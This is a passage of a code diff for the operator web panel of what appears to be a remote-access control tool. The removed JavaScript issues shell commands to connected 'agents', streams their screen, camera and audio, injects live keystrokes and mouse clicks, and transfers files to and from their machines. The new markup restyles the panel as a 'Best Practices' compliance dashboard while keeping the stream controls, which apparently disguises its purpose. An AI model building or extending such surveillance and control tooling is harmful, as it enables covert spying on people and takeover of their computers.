-                                <button class="btn btn-success" onclick="startScreenStream()">Start Screen</button>
-                                <button class="btn btn-danger" onclick="stopScreenStream()">Stop</button>
-                            </div>
-                        </div>
-                        
-                        <div class="video-panel">
-                            <video id="camera-video" autoplay muted></video>
-                            <div class="video-controls">
-                                <button class="btn btn-success" onclick="startCameraStream()">Start Camera</button>
-                                <button class="btn btn-danger" onclick="stopCameraStream()">Stop</button>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <div class="webrtc-panel" style="margin-top: 16px;">
-                        <video id="webrtc-video" class="webrtc-video" autoplay muted></video>
-                        <div class="webrtc-controls">
-                            <button class="btn btn-success" onclick="startWebRTCStream()">Start WebRTC</button>
-                            <button class="btn btn-danger" onclick="stopWebRTCStream()">Stop WebRTC</button>
-                            <button class="btn" onclick="getWebRTCStats()">Get Stats</button>
-                            <button class="btn" onclick="setWebRTCQuality()">Set Quality</button>
-                        </div>
-                        <div id="webrtc-status" class="status-display" style="display:none;"></div>
-                    </div>
-                </div>
-            </div>
-            
-            <!-- Right Sidebar - Terminal & Metrics -->
-            <div class="sidebar">
-                <div class="panel-header">
-                    <span>📊</span>
-                    System Status
-                </div>
-                <div class="panel-content">
-                    <div class="metrics-grid">
-                        <div class="metric-card">
-                            <div class="metric-value" id="active-agents">0</div>
-                            <div class="metric-label">Active Agents</div>
-                        </div>
-                        <div class="metric-card">
-                            <div class="metric-value" id="total-commands">0</div>
-                            <div class="metric-label">Commands Executed</div>
-                        </div>
-                        <div class="metric-card">
-                            <div class="metric-value" id="streams-active">0</div>
-                            <div class="metric-label">Active Streams</div>
-                        </div>
-                        <div class="metric-card">
-                            <div class="metric-value" id="system-status">OK</div>
-                            <div class="metric-label">System Status</div>
-                        </div>
-                    </div>
-                    
-                    <div class="control-group">
-                        <div class="control-header">Output Terminal</div>
-                        <div class="terminal" id="output-terminal">System ready...</div>
-                    </div>
-                    
-                    <div class="control-group">
-                        <div class="control-header">Configuration</div>
-                        <div id="config-status" class="status-display">Checking configuration...</div>
-                    </div>
-                    
-                    <div class="control-group">
-                        <div class="control-header">Password Management</div>
-                        <input type="password" class="neural-input" id="new-password" placeholder="New password">
-                        <button class="btn" onclick="changePassword()">Change Password</button>
-                    </div>
-                </div>
-            </div>
-        </div>
+
+  <div class="top-nav">
+    <div class="brand">
+      <div class="logo">N</div>
+      <div style="display:flex;flex-direction:column;line-height:1">
+        <h1>NEURAL CONTROL HUB</h1>
+        <div class="muted small">Best Practices — Live Monitoring</div>
+      </div>
+
+      <div class="nav-tabs" style="margin-left:22px">
+        <div class="nav-tab">Overview</div>
+        <div class="nav-tab">Threats</div>
+        <div class="nav-tab active">Best Practices</div>
+        <div class="nav-tab">Compliance</div>
+      </div>
     </div>
 
+    <div class="top-actions">
+      <div class="small muted">Cluster: <strong style="color:white">Prod-01</strong></div>
+      <button class="btn">New Scan</button>
+      <a href="/logout" class="logout">Logout</a>
+    </div>
+  </div>
 
-                    <div class="control-group">
-                        <div class="control-header">Change Admin Password</div>
+  <div class="page">
 
-
-        <!-- Hidden audio player for streams -->
-        <audio id="audio-player" controls style="display:none; width: 100%; margin-top: 10px;"></audio>
+    <!-- FILTERS -->
+    <div class="filters">
+      <div class="filter select">Device Group: <strong style="margin-left:8px;color:white">All</strong></div>
+      <div class="filter select">Category: <strong style="margin-left:8px;color:white">Security</strong></div>
+      <div class="filter">Checks: <strong style="margin-left:8px;color:white">Failed</strong></div>
+      <div class="filter">Time Range: <strong style="margin-left:8px;color:white">Last 30 days</strong></div>
+      <div class="spacer"></div>
+      <div class="filter small">Export</div>
+      <div class="filter small">Refresh</div>
     </div>
 
-    <script>
-        const socket = io();
-        let selectedAgentId = null;
-        let videoWindow = null;
-        let cameraWindow = null;
-        let audioPlayer = null;
+    <!-- LEFT -->
+    <div class="sidebar card">
+      <h3>Active Agents</h3>
+      <div class="agent-list" id="agent-list">
+        <!-- JS will populate -->
+        <div style="text-align:center;padding:26px;color:var(--muted);border-radius:10px;border:1px dashed rgba(255,255,255,0.02)">
+          No agents connected
+        </div>
+      </div>
 
-        // --- Agent Management ---
-        function selectAgent(element, agentId) {
-            if (selectedAgentId === agentId) return;
+      <div class="controls">
+        <input type="hidden" id="agent-id" value="">
+        <button class="control-btn primary" onclick="startScreenStream()">Start Screen</button>
+        <button class="control-btn" onclick="startCameraStream()">Start Camera</button>
+        <button class="control-btn" onclick="listProcesses()">List Processes</button>
+        <button class="control-btn" onclick="stopAllStreams()">Stop All</button>
+      </div>
+    </div>
 
-            // Clean up previous agent's state
-            if (selectedAgentId) {
-                stopAllStreams(); // Stop streams for the old agent
-            }
+    <!-- CENTER -->
+    <div class="center">
+      <!-- Summary row -->
+      <div class="card summary-row">
+        <div class="summary-card">
+          <div class="chart-wrap">
+            <canvas id="doughnut1" width="100" height="100"></canvas>
+          </div>
+          <div class="info">
+            <div class="metric-big" id="metric1">23</div>
+            <div class="metric-sub">Rules failing — Unique failed checks</div>
+            <div class="small muted">CSC vs Non-CSC breakdown</div>
+          </div>
+        </div>
 
-            selectedAgentId = agentId;
-            document.querySelectorAll('.agent-item').forEach(item => item.classList.remove('selected'));
-            element.classList.add('selected');
-            document.getElementById('agent-id').value = agentId;
-            document.getElementById('output-terminal').textContent = `Agent ${agentId.substring(0,8)}... selected. Ready for commands.`;
-        }
+        <div class="summary-card">
+          <div class="chart-wrap">
+            <canvas id="doughnut2" width="100" height="100"></canvas>
+          </div>
+          <div class="info">
+            <div class="metric-big" id="metric2">8</div>
+            <div class="metric-sub">Profiles failing</div>
+            <div class="small muted">Highlights most-impactful profiles</div>
+          </div>
+        </div>
 
-        function updateAgentList(agents) {
-            const agentList = document.getElementById('agent-list');
-            agentList.innerHTML = '';
+        <div class="summary-card">
+          <div class="chart-wrap">
+            <canvas id="doughnut3" width="100" height="100"></canvas>
+          </div>
+          <div class="info">
+            <div class="metric-big" id="metric3">41%</div>
+            <div class="metric-sub">Overall Pass Rate</div>
+            <div class="small muted">Trend vs previous period</div>
+          </div>
+        </div>
+      </div>
 
-            if (Object.keys(agents).length === 0) {
-                agentList.innerHTML = `
-                    <div class="agent-item">
-                        <div class="agent-status">
-                            <div class="status-indicator offline"></div>
-                            <span>No agents connected</span>
-                        </div>
-                    </div>
-                `;
-                return;
-            }
+      <!-- Trend chart -->
+      <div class="card">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+          <div style="font-weight:700">Best Practice Trend</div>
+          <div class="muted small">Last 30 days</div>
+        </div>
+        <div class="trend">
+          <canvas id="trendChart" width="800" height="320"></canvas>
+        </div>
+      </div>
 
-            for (const agentId in agents) {
-                const agent = agents[agentId];
-                const agentItem = document.createElement('div');
-                agentItem.className = 'agent-item';
-                agentItem.onclick = () => selectAgent(agentItem, agentId);
-                
-                const lastSeen = new Date(agent.last_seen).toLocaleString();
-                agentItem.innerHTML = `
-                    <div class="agent-status">
-                        <div class="status-indicator"></div>
-                        <span>${agentId.substring(0, 8)}...</span>
-                    </div>
-                    <div style="font-size: 0.75rem; color: var(--text-muted);">Last seen: ${lastSeen}</div>
-                `;
-                
-                if (agentId === selectedAgentId) {
-                    agentItem.classList.add('selected');
-                }
-                
-                agentList.appendChild(agentItem);
-            }
-        }
+      <!-- Videos and WebRTC -->
+      <div style="display:flex;gap:12px">
+        <div class="card" style="flex:1">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+            <div style="font-weight:700">Live Streams</div>
+            <div class="muted small">Agent streams</div>
+          </div>
+          <div class="videos">
+            <div class="video-card">
+              <video id="screen-video" autoplay muted playsinline></video>
+              <div class="video-overlay">
+                <div class="video-status" id="screen-status">Screen Stream</div>
+              </div>
+            </div>
+            <div class="video-card">
+              <video id="camera-video" autoplay muted playsinline></video>
+              <div class="video-overlay">
+                <div class="video-status" id="camera-status">Camera Stream</div>
+              </div>
+            </div>
+          </div>
+          
+          <!-- WebRTC Stream Display -->
+          <div style="margin-top:12px">
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+              <div style="font-weight:700">WebRTC Stream</div>
+              <div class="muted small">Low-latency</div>
+            </div>
+            <div class="video-card" style="height:140px">
+              <video id="webrtc-video" autoplay muted playsinline></video>
+              <div class="video-overlay">
+                <div class="video-status" id="webrtc-status">WebRTC Stream</div>
+              </div>
+            </div>
+          </div>
+        </div>
 
-        // --- Command & Control ---
-        function issueCommand() {
-            const command = document.getElementById('command').value;
-            if (!selectedAgentId) {
-                showStatus('Please select an agent first.', 'error');
-                return;
-            }
-            if (!command) {
-                showStatus('Please enter a command.', 'error');
-                return;
-            }
-
-            socket.emit('execute_command', { agent_id: selectedAgentId, command: command });
-            document.getElementById('output-terminal').textContent = `> ${command}\nExecuting...`;
-            document.getElementById('command').value = '';
-        }
-
-        function issueCommandInternal(agentId, command) {
-            if (!agentId) return;
-            socket.emit('execute_command', { agent_id: agentId, command: command });
-        }
-
-        // --- Streaming ---
-        function startScreenStream() {
-            if (!selectedAgentId) { 
-                showStatus('Please select an agent first.', 'error');
-                return; 
-            }
+        <div class="card" style="width:340px">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+            <div style="font-weight:700">WebRTC Controls</div>
+            <div class="muted small">Low-latency</div>
+          </div>
+          
+          <div style="display:flex;flex-direction:column;gap:8px;margin-bottom:12px">
+            <button class="control-btn primary" onclick="startWebRTCStream()">Start WebRTC</button>
+            <button class="control-btn" onclick="stopWebRTCStream()">Stop WebRTC</button>
+            <button class="control-btn" onclick="getWebRTCStats()">Get Stats</button>
             
-            issueCommandInternal(selectedAgentId, 'start-stream');
-            issueCommandInternal(selectedAgentId, 'start-audio');
-
-            const screenVideo = document.getElementById('screen-video');
-            screenVideo.src = `/video_feed/${selectedAgentId}`;
-            
-            audioPlayer = document.getElementById('audio-player');
-            audioPlayer.src = `/audio_feed/${selectedAgentId}`;
-            audioPlayer.style.display = 'block';
-            audioPlayer.play();
-            
-            showStatus('Screen stream started', 'success');
-        }
-
-        function startCameraStream() {
-            if (!selectedAgentId) { 
-                showStatus('Please select an agent first.', 'error');
-                return; 
-            }
-
-            issueCommandInternal(selectedAgentId, 'start-camera');
-            const cameraVideo = document.getElementById('camera-video');
-            cameraVideo.src = `/camera_feed/${selectedAgentId}`;
-            showStatus('Camera stream started', 'success');
-        }
-
-        function stopScreenStream() {
-            if (!selectedAgentId) { 
-                showStatus('Please select an agent first.', 'error');
-                return; 
-            }
-            
-            issueCommandInternal(selectedAgentId, 'stop-stream');
-            const screenVideo = document.getElementById('screen-video');
-            screenVideo.src = '';
-            showStatus('Screen stream stopped', 'success');
-        }
-
-        function stopCameraStream() {
-            if (!selectedAgentId) { 
-                showStatus('Please select an agent first.', 'error');
-                return; 
-            }
-            
-            issueCommandInternal(selectedAgentId, 'stop-camera');
-            const cameraVideo = document.getElementById('camera-video');
-            cameraVideo.src = '';
-            showStatus('Camera stream stopped', 'success');
-        }
-
-        function stopAllStreams() {
-            if (selectedAgentId) {
-                issueCommandInternal(selectedAgentId, 'stop-stream');
-                issueCommandInternal(selectedAgentId, 'stop-audio');
-                issueCommandInternal(selectedAgentId, 'stop-camera');
-            }
-            if (audioPlayer) {
-                audioPlayer.pause();
-                audioPlayer.src = '';
-                audioPlayer.style.display = 'none';
-            }
-            if (videoWindow && !videoWindow.closed) videoWindow.close();
-            if (cameraWindow && !cameraWindow.closed) cameraWindow.close();
-            
-            showStatus('All streams stopped', 'success');
-        }
-
-        function listProcesses() {
-            document.getElementById('command').value = 'Get-Process | Select-Object Name, Id, MainWindowTitle | Format-Table -AutoSize';
-            issueCommand();
-        }
-
-        function showStatus(message, type) {
-            // Create a temporary status display
-            const statusDiv = document.createElement('div');
-            statusDiv.className = `status-display status-${type}`;
-            statusDiv.textContent = message;
-            statusDiv.style.position = 'fixed';
-            statusDiv.style.top = '20px';
-            statusDiv.style.right = '20px';
-            statusDiv.style.zIndex = '1000';
-            statusDiv.style.padding = '12px 16px';
-            statusDiv.style.borderRadius = '6px';
-            statusDiv.style.color = 'white';
-            statusDiv.style.fontWeight = '500';
-            
-            if (type === 'error') {
-                statusDiv.style.background = 'var(--accent-red)';
-            } else if (type === 'success') {
-                statusDiv.style.background = 'var(--accent-green)';
-            } else {
-                statusDiv.style.background = 'var(--accent-blue)';
-            }
-            
-            document.body.appendChild(statusDiv);
-            setTimeout(() => { 
-                statusDiv.remove(); 
-            }, 3000);
-        }
-
-        // --- Socket.IO Event Handlers ---
-        socket.on('connect', () => {
-            console.log('Connected to controller');
-            socket.emit('operator_connect'); // Announce presence as an operator
-        });
-
-        socket.on('disconnect', () => {
-            console.log('Disconnected from controller');
-        });
-
-        socket.on('agent_list_update', (agents) => {
-            updateAgentList(agents);
-        });
-
-        socket.on('command_output', (data) => {
-            if (data.agent_id === selectedAgentId) {
-                const outputTerminal = document.getElementById('output-terminal');
-                // Append new output, keeping previous content
-                outputTerminal.textContent += `\n${data.output}`;
-                outputTerminal.scrollTop = outputTerminal.scrollHeight; // Scroll to bottom
-            }
-        });
-
-        socket.on('status_update', (data) => {
-            showStatus(data.message, data.type);
-        });
-
-        // Add key listener to command input
-        document.getElementById('command').addEventListener('keyup', function(event) {
-            if (event.key === 'Enter') {
-                issueCommand();
-            }
-        });
-
-        // Configuration status management
-        function refreshConfigStatus() {
-            fetch('/config-status')
-                .then(response => response.json())
-                .then(data => {
-                    document.getElementById('admin-password-status').textContent = 
-                        data.admin_password_set ? `Set (${data.admin_password_length} chars)` : 'Not set';
-                    document.getElementById('hash-algorithm').textContent = 
-                        `${data.password_hash_algorithm} (${data.hash_iterations} iterations)`;
-                    document.getElementById('session-timeout').textContent = 
-                        `${data.session_timeout} seconds`;
-                    document.getElementById('max-login-attempts').textContent = 
-                        data.max_login_attempts.toString();
-                    document.getElementById('blocked-ips').textContent = 
-                        data.blocked_ips.length > 0 ? data.blocked_ips.join(', ') : 'None';
-                })
-                .catch(error => {
-                    console.error('Error fetching config status:', error);
-                    document.getElementById('admin-password-status').textContent = 'Error';
-                    document.getElementById('hash-algorithm').textContent = 'Error';
-                    document.getElementById('session-timeout').textContent = 'Error';
-                    document.getElementById('max-login-attempts').textContent = 'Error';
-                    document.getElementById('blocked-ips').textContent = 'Error';
-                });
-        }
-
-        // Load config status on page load
-        document.addEventListener('DOMContentLoaded', function() {
-            refreshConfigStatus();
-        });
-
-        // Password management functions
-        function changePassword() {
-            const currentPassword = document.getElementById('current-password').value;
-            const newPassword = document.getElementById('new-password').value;
-            const confirmPassword = document.getElementById('confirm-password').value;
-            const statusDiv = document.getElementById('password-change-status');
-
-            // Validation
-            if (!currentPassword || !newPassword || !confirmPassword) {
-                showPasswordStatus('Please fill in all password fields.', 'error');
-                return;
-            }
-
-            if (newPassword.length < 8) {
-                showPasswordStatus('New password must be at least 8 characters long.', 'error');
-                return;
-            }
-
-            if (newPassword !== confirmPassword) {
-                showPasswordStatus('New passwords do not match.', 'error');
-                return;
-            }
-
-            // Send password change request
-            fetch('/change-password', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    current_password: currentPassword,
-                    new_password: newPassword
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.success) {
-                    showPasswordStatus('Password changed successfully!', 'success');
-                    // Clear form
-                    document.getElementById('current-password').value = '';
-                    document.getElementById('new-password').value = '';
-                    document.getElementById('confirm-password').value = '';
-                    // Refresh config status
-                    refreshConfigStatus();
-                } else {
-                    showPasswordStatus(data.message, 'error');
-                }
-            })
-            .catch(error => {
-                showPasswordStatus('Error changing password: ' + error.message, 'error');
-            });
-        }
-
-        function showPasswordStatus(message, type) {
-            const statusDiv = document.getElementById('password-change-status');
-            statusDiv.style.display = 'block';
-            statusDiv.className = `status-indicator status-${type}`;
-            statusDiv.textContent = message;
-            setTimeout(() => { statusDiv.style.display = 'none'; }, 5000);
-        }
-
-        // Password strength indicator
-        function checkPasswordStrength(password) {
-            let strength = 0;
-            if (password.length >= 8) strength++;
-            if (/[a-z]/.test(password)) strength++;
-            if (/[A-Z]/.test(password)) strength++;
-            if (/[0-9]/.test(password)) strength++;
-            if (/[^A-Za-z0-9]/.test(password)) strength++;
-            
-            if (strength < 3) return 'weak';
-            if (strength < 5) return 'medium';
-            return 'strong';
-        }
-
-        // Add password strength indicator
-        document.getElementById('new-password').addEventListener('input', function() {
-            const password = this.value;
-            const strength = checkPasswordStrength(password);
-            const strengthDiv = this.parentNode.querySelector('.password-strength');
-            
-            if (strengthDiv) {
-                strengthDiv.remove();
-            }
-            
-            if (password.length > 0) {
-                const div = document.createElement('div');
-                div.className = `password-strength password-${strength}`;
-                div.textContent = `Password strength: ${strength.charAt(0).toUpperCase() + strength.slice(1)}`;
-                this.parentNode.appendChild(div);
-            }
-        });
-
-        // --- Live Keyboard Event Listeners ---
-        const liveKeyboardInput = document.getElementById('live-keyboard-input');
-        const liveMouseArea = document.getElementById('live-mouse-area');
-
-        liveKeyboardInput.addEventListener('keydown', (event) => {
-            if (!selectedAgentId) return;
-            event.preventDefault();
-            socket.emit('live_key_press', {
-                agent_id: selectedAgentId,
-                event_type: 'down',
-                key: event.key,
-                code: event.code,
-                shift: event.shiftKey,
-                ctrl: event.ctrlKey,
-                alt: event.altKey,
-                meta: event.metaKey
-            });
-        });
-
-        liveKeyboardInput.addEventListener('keyup', (event) => {
-            if (!selectedAgentId) return;
-            event.preventDefault();
-            socket.emit('live_key_press', {
-                agent_id: selectedAgentId,
-                event_type: 'up',
-                key: event.key,
-                code: event.code
-            });
-        });
-        liveMouseArea.addEventListener('mousemove', (event) => {
-            if (!selectedAgentId) return;
-
-            // Get the coordinates relative to the mouse area
-            const rect = liveMouseArea.getBoundingClientRect();
-            const x = event.clientX - rect.left;
-            const y = event.clientY - rect.top;
-
-            socket.emit('live_mouse_move', {
-                agent_id: selectedAgentId,
-                x: x,
-                y: y
-            });
-        });
-
-        liveMouseArea.addEventListener('mousedown', (event) => {
-            if (!selectedAgentId) return;
-
-            const button = document.getElementById('mouse-button').value;
-
-            socket.emit('live_mouse_click', {
-                agent_id: selectedAgentId,
-                event_type: 'down',
-                button: button
-            });
-        });
-
-        liveMouseArea.addEventListener('mouseup', (event) => {
-            if (!selectedAgentId) return;
-
-            const button = document.getElementById('mouse-button').value;
-
-            socket.emit('live_mouse_click', {
-                agent_id: selectedAgentId,
-                event_type: 'up',
-                button: button
-            });
-        });
-
-        // --- File Transfer (Chunked) ---
-        let fileChunks = {};
-
-        function uploadFile() {
-            if (!selectedAgentId) {
-                showStatus('Please select an agent first.', 'error');
-                return;
-            }
-            const fileInput = document.getElementById('upload-file');
-            const file = fileInput.files[0];
-
-            if (!file) {
-                showStatus('Please select a file to upload.', 'error');
-                return;
-            }
-
-            const CHUNK_SIZE = 1024 * 512; // 512KB
-            let offset = 0;
-
-            showStatus(`Starting upload of ${file.name}...`, 'success');
-            const reader = new FileReader();
-
-            function readSlice(o) {
-                const slice = file.slice(o, o + CHUNK_SIZE);
-                reader.readAsDataURL(slice);
-            }
-
-            reader.onload = function(e) {
-                const chunk = e.target.result;
-                const agentUploadPath = document.getElementById('agent-upload-path').value;
-                socket.emit('upload_file_chunk', {
-                    agent_id: selectedAgentId,
-                    filename: file.name,
-                    data: chunk,
-                    offset: offset,
-                    destination_path: agentUploadPath
-                });
-                
-                // Estimate offset for progress. Note: base64 is larger.
-                // A more accurate progress would require more complex calculations.
-                offset += CHUNK_SIZE; 
-                if (offset > file.size) offset = file.size;
-
-                showFileTransferProgress(file.name, offset, file.size, 'Uploading');
-
-                if (offset < file.size) {
-                    readSlice(offset);
-                } else {
-                    socket.emit('upload_file_end', {
-                        agent_id: selectedAgentId,
-                        filename: file.name
-                    });
-                    showStatus(`File ${file.name} upload complete.`, 'success');
-                }
-            };
-            readSlice(0);
-        }
-
-        function uploadFile() {
-            const fileInput = document.getElementById('file-upload');
-            const file = fileInput.files[0];
-            if (!file) {
-                showStatus('Please select a file to upload.', 'error');
-                return;
-            }
-            if (!selectedAgentId) {
-                showStatus('Please select an agent first.', 'error');
-                return;
-            }
-            
-            const reader = new FileReader();
-            reader.onload = function(e) {
-                const chunkSize = 1024 * 1024; // 1MB chunks
-                const fileData = e.target.result;
-                const totalChunks = Math.ceil(fileData.byteLength / chunkSize);
-                
-                for (let i = 0; i < totalChunks; i++) {
-                    const chunk = fileData.slice(i * chunkSize, (i + 1) * chunkSize);
-                    socket.emit('upload_file_chunk', {
-                        agent_id: selectedAgentId,
-                        filename: file.name,
-                        chunk: Array.from(new Uint8Array(chunk)),
-                        chunk_index: i,
-                        total_chunks: totalChunks
-                    });
-                }
-                
-                socket.emit('upload_file_end', {
-                    agent_id: selectedAgentId,
-                    filename: file.name,
-                    total_size: fileData.byteLength
-                });
-                
-                showStatus('File upload started', 'success');
-            };
-            reader.readAsArrayBuffer(file);
-        }
-
-        function downloadFile() {
-            if (!selectedAgentId) {
-                showStatus('Please select an agent first.', 'error');
-                return;
-            }
-            const filename = document.getElementById('download-filename').value;
-            if (!filename) {
-                showStatus('Please enter a filename to download.', 'error');
-                return;
-            }
-            fileChunks[filename] = []; // Reset chunks
-            const localPath = document.getElementById('local-download-path').value;
-            socket.emit('download_file', {
-                agent_id: selectedAgentId,
-                filename: filename,
-                local_path: localPath
-            });
-            showStatus(`Requesting ${filename} from agent...`, 'success');
-        }
-
-        function showFileTransferProgress(filename, loaded, total, action) {
-            const progress = total > 0 ? Math.round((loaded / total) * 100) : 100;
-            const statusDiv = document.getElementById('file-transfer-status');
-            statusDiv.style.display = 'block';
-            statusDiv.className = 'status-indicator status-success';
-            statusDiv.textContent = `${action} ${filename}: ${progress}%`;
-             if (progress >= 100) {
-                setTimeout(() => { statusDiv.style.display = 'none'; }, 3000);
-            }
-        }
-
-        socket.on('file_download_chunk', (data) => {
-            if (data.agent_id !== selectedAgentId) return;
-
-            const { filename, chunk, offset, total_size, error } = data;
-
-            if (error) {
-                showStatus(`Error downloading ${filename}: ${error}`, 'error');
-                if(fileChunks[filename]) delete fileChunks[filename];
-                return;
-            }
-
-            if (!fileChunks[filename]) {
-                fileChunks[filename] = [];
-            }
-            
-            try {
-                const byteString = atob(chunk.split(',')[1]);
-                const ab = new ArrayBuffer(byteString.length);
-                const ia = new Uint8Array(ab);
-                for (let i = 0; i < byteString.length; i++) {
-                    ia[i] = byteString.charCodeAt(i);
-                }
-                fileChunks[filename].push(ia);
-            } catch (e) {
-                showStatus(`Error processing chunk for ${filename}: ${e}`, 'error');
-                delete fileChunks[filename];
-                return;
-            }
-
-            const loaded = fileChunks[filename].reduce((acc, curr) => acc + curr.length, 0);
-            showFileTransferProgress(filename, loaded, total_size, 'Downloading');
-
-            if (loaded >= total_size) {
-                const blob = new Blob(fileChunks[filename], { type: 'application/octet-stream' });
-                const link = document.createElement('a');
-                link.href = URL.createObjectURL(blob);
-                link.download = filename;
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
-                showStatus(`Downloaded ${filename}.`, 'success');
-                delete fileChunks[filename];
-            }
-        });
-
-        // --- H.264 Video Streaming via MSE ---
-        let mseSourceBuffer = null;
-        let mseMediaSource = null;
-        let videoElement = null;
-        let mseQueue = [];
-        let mseReady = false;
-        let videoAgentId = null;
-
-        // --- WebRTC Variables ---
-        let webrtcPeerConnection = null;
-        let webrtcStream = null;
-        let webrtcAgentId = null;
-
-        function setupMSE() {
-            videoElement = document.getElementById('h264-video');
-            if (!window.MediaSource) {
-                document.getElementById('video-status').textContent = 'MediaSource Extensions not supported.';
-                return;
-            }
-            mseMediaSource = new MediaSource();
-            videoElement.src = URL.createObjectURL(mseMediaSource);
-            mseMediaSource.addEventListener('sourceopen', () => {
-                mseSourceBuffer = mseMediaSource.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');
-                mseSourceBuffer.mode = 'segments';
-                mseSourceBuffer.addEventListener('updateend', () => {
-                    if (mseQueue.length > 0 && !mseSourceBuffer.updating) {
-                        mseSourceBuffer.appendBuffer(mseQueue.shift());
-                    }
-                });
-                mseReady = true;
-            });
-        }
-
-        function requestVideoFrame(agentId) {
-            if (!agentId) return;
-            socket.emit('request_video_frame', {agent_id: agentId});
-        }
-
-        socket.on('video_frame', (data) => {
-            if (!mseReady || !mseSourceBuffer) return;
-            const frameData = data.frame;
-            if (!frameData) return;
-            // Convert base64 to ArrayBuffer
-            const byteString = atob(frameData);
-            const ab = new Uint8Array(byteString.length);
-            for (let i = 0; i < byteString.length; i++) ab[i] = byteString.charCodeAt(i);
-            if (mseSourceBuffer.updating || mseQueue.length > 0) {
-                mseQueue.push(ab.buffer);
-            } else {
-                mseSourceBuffer.appendBuffer(ab.buffer);
-            }
-        });
-
-        // Periodically request frames for the selected agent
-        setInterval(() => {
-            if (selectedAgentId) {
-                requestVideoFrame(selectedAgentId);
-            }
-        }, 100);
-
-        document.addEventListener('DOMContentLoaded', setupMSE);
-
-        // --- WebRTC Functions ---
-        function startWebRTCStream() {
-            if (!selectedAgentId) {
-                showStatus('Please select an agent first.', 'error');
-                return;
-            }
-
-            if (webrtcPeerConnection) {
-                stopWebRTCStream();
-            }
-
-            webrtcAgentId = selectedAgentId;
-            
-            // Create RTCPeerConnection
-            const configuration = {
-                iceServers: [
-                    { urls: 'stun:stun.l.google.com:19302' },
-                    { urls: 'stun:stun1.l.google.com:19302' }
-                ]
-            };
-
-            webrtcPeerConnection = new RTCPeerConnection(configuration);
-            
-            // Set up event handlers
-            webrtcPeerConnection.ontrack = function(event) {
-                console.log('WebRTC track received:', event.track.kind);
-                if (event.track.kind === 'video') {
-                    document.getElementById('webrtc-video').srcObject = event.streams[0];
-                }
-                webrtcStream = event.streams[0];
-            };
-
-            webrtcPeerConnection.onicecandidate = function(event) {
-                if (event.candidate) {
-                    socket.emit('webrtc_ice_candidate', {
-                        agent_id: webrtcAgentId,
-                        candidate: event.candidate
-                    });
-                }
-            };
-
-            webrtcPeerConnection.onconnectionstatechange = function() {
-                console.log('WebRTC connection state:', webrtcPeerConnection.connectionState);
-                updateWebRTCStatus(webrtcPeerConnection.connectionState);
-            };
-
-            // Create offer
-            webrtcPeerConnection.createOffer()
-                .then(offer => webrtcPeerConnection.setLocalDescription(offer))
-                .then(() => {
-                    // Send offer to agent via controller
-                    socket.emit('webrtc_offer', {
-                        agent_id: webrtcAgentId,
-                        offer: webrtcPeerConnection.localDescription.sdp
-                    });
-                    
-                    updateWebRTCStatus('Creating offer...');
-                    showStatus('WebRTC stream starting...', 'success');
-                })
-                .catch(error => {
-                    console.error('Error creating WebRTC offer:', error);
-                    showStatus('Error starting WebRTC stream', 'error');
-                    updateWebRTCStatus('Error');
-                });
-        }
-
-        function stopWebRTCStream() {
-            if (webrtcPeerConnection) {
-                webrtcPeerConnection.close();
-                webrtcPeerConnection = null;
-            }
-            
-            if (webrtcStream) {
-                webrtcStream.getTracks().forEach(track => track.stop());
-                webrtcStream = null;
-            }
-            
-            document.getElementById('webrtc-video').srcObject = null;
-            updateWebRTCStatus('Stopped');
-            showStatus('WebRTC stream stopped', 'success');
-            
-            // Notify agent to stop WebRTC streaming
-            if (webrtcAgentId) {
-                socket.emit('webrtc_stop_streaming', { agent_id: webrtcAgentId });
-                webrtcAgentId = null;
-            }
-        }
-
-        function getWebRTCStats() {
-            if (!webrtcPeerConnection) {
-                showStatus('No WebRTC connection active', 'error');
-                return;
-            }
-
-            webrtcPeerConnection.getStats()
-                .then(stats => {
-                    let statsText = 'WebRTC Statistics:\n';
-                    stats.forEach(report => {
-                        if (report.type === 'inbound-rtp' && report.mediaType === 'video') {
-                            statsText += `Video: ${report.framesReceived} frames, ${report.bytesReceived} bytes\n`;
-                        }
-                        if (report.type === 'inbound-rtp' && report.mediaType === 'audio') {
-                            statsText += `Audio: ${report.bytesReceived} bytes\n`;
-                        }
-                    });
-                    document.getElementById('webrtc-stats').textContent = statsText;
-                })
-                .catch(error => {
-                    console.error('Error getting WebRTC stats:', error);
-                    showStatus('Error getting WebRTC stats', 'error');
-                });
-        }
-
-        function updateWebRTCStatus(status) {
-            const statusDiv = document.getElementById('webrtc-status');
-            statusDiv.textContent = `Status: ${status}`;
-            
-            // Color coding for different states
-            switch(status) {
-                case 'connected':
-                    statusDiv.style.color = '#00ff88';
-                    break;
-                case 'connecting':
-                    statusDiv.style.color = '#ffc107';
-                    break;
-                case 'failed':
-                case 'Error':
-                    statusDiv.style.color = '#ff4757';
-                    break;
-                default:
-                    statusDiv.style.color = '#00d4ff';
-            }
-        }
-
-        // WebRTC Socket.IO event handlers
-        socket.on('webrtc_answer', function(data) {
-            if (webrtcPeerConnection && webrtcPeerConnection.signalingState !== 'closed') {
-                const answer = new RTCSessionDescription({
-                    type: data.type,
-                    sdp: data.answer
-                });
-                
-                webrtcPeerConnection.setRemoteDescription(answer)
-                    .then(() => {
-                        updateWebRTCStatus('Connected');
-                        showStatus('WebRTC stream connected!', 'success');
-                    })
-                    .catch(error => {
-                        console.error('Error setting remote description:', error);
-                        updateWebRTCStatus('Error');
-                        showStatus('Error connecting WebRTC stream', 'error');
-                    });
-            }
-        });
-
-        socket.on('webrtc_error', function(data) {
-            console.error('WebRTC error:', data.message);
-            updateWebRTCStatus('Error');
-            showStatus(`WebRTC error: ${data.message}`, 'error');
-        });
-
-        socket.on('webrtc_stats', function(data) {
-            console.log('WebRTC stats received:', data);
-            let statsText = `Connection: ${data.connection_state}\n`;
-            statsText += `ICE: ${data.ice_connection_state}\n`;
-            statsText += `Signaling: ${data.signaling_state}`;
-            document.getElementById('webrtc-stats').textContent = statsText;
-        });
-
-
-
-    </script>
+            <div style="display:flex;gap:8px;align-items:center">
+              <label class="small muted">Quality:</label>
